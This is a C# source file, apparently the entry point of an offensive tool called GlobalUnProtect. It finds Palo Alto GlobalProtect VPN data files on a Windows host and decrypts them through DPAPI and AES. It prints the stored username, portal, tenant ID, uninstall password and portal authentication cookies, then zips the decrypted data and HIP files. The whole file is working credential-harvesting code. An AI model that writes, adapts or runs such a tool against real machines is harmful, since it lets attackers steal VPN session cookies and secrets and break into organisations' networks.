using GlobalUnProtect.Utilities;
using System;
using System.Collections.Generic;
using System.IO;

namespace GlobalUnProtect {  
    class Program
    {
        static void Main(string[] args)

        {


            if (args.Length == 0)
            {
                Console.WriteLine("Usage: GlobalUnProtect.exe C:\\Path\\To\\Output.zip");
                return;
            }

            string outputFileName = args[0];

            byte[] aesKey = GlobalUnProtect.Utilities.KeyDerivation.GetKey();

            Console.WriteLine($"[*] Starting search for GlobalProtect data files");

            List<string> datFiles = GlobalUnProtect.Utilities.ConfigFinder.Search();

            foreach (string filePath in datFiles)
            {
                Console.WriteLine($"\t[*] Found: {filePath}");
            }


            

            if(datFiles.Count > 0) 
            {

                var inMemoryZip = new InMemoryZip();

                foreach (string filePath in datFiles)
                {

                    try
                    {

                        byte[] dpapiDecrypted = Utilities.Decryption.DPAPIUnprotect(filePath);
                        byte[] decryptedBytes = Utilities.Decryption.AESDecrypt(dpapiDecrypted, aesKey);

                        string fileName = Path.GetFileName(filePath);

                        File.WriteAllBytes(outputFileName, decryptedBytes);
                        inMemoryZip.AddFile(decryptedBytes, fileName);
                    

                        if (Path.GetFileName(filePath).StartsWith("PanPortalCfg", StringComparison.OrdinalIgnoreCase))
                        {
                            Console.WriteLine($"[*] {Path.GetFileName(filePath)} looks like a portal config file, parsing for convenience:");


                            Console.WriteLine($"\t[*] User Name: {Utilities.RegistryRead.GetGPStringRegistryValue("username")}");
                            Console.WriteLine($"\t[*] Portal: {Utilities.RegistryRead.GetGPStringRegistryValue("LastUrl")}");

                            Console.WriteLine($"\t[*] User Domain: {Utilities.ParseXML.GetXMLContentFromPath(decryptedBytes, "//policy/user-domain")}");
                            Console.WriteLine($"\t[*] Portal Name: {Utilities.ParseXML.GetXMLContentFromPath(decryptedBytes, "//policy/portal-name")}");
                            Console.WriteLine($"\t[*] Tenant Id: {Utilities.ParseXML.GetXMLContentFromPath(decryptedBytes, "//policy/tenant-id")}");
                            Console.WriteLine($"\t[*] Uninstall password: {Utilities.ParseXML.GetXMLContentFromPath(decryptedBytes, "//policy/agent-ui/uninstall-passwd")}");
                            Console.WriteLine($"\t[*] Portal Pre-logon Cookie: {Utilities.ParseXML.GetXMLContentFromPath(decryptedBytes, "//policy/portal-prelogonuserauthcookie")}");
                            Console.WriteLine($"\t[*] Portal User-auth Cookie: {Utilities.ParseXML.GetXMLContentFromPath(decryptedBytes, "//policy/portal-userauthcookie")}");
                        }
                    }

                    catch (Exception ex)
                    {
                        Console.WriteLine($"[!] Error handling {Path.GetFileName(filePath)}: {ex.Message}");
                    }
                }

                GlobalUnProtect.Utilities.HIPRecon.CollectHIPFiles(aesKey, inMemoryZip);

                Console.WriteLine($"[*] Writing output ZIP file to {outputFileName}");

                inMemoryZip.WriteZip(outputFileName);

            }
        }
    }
}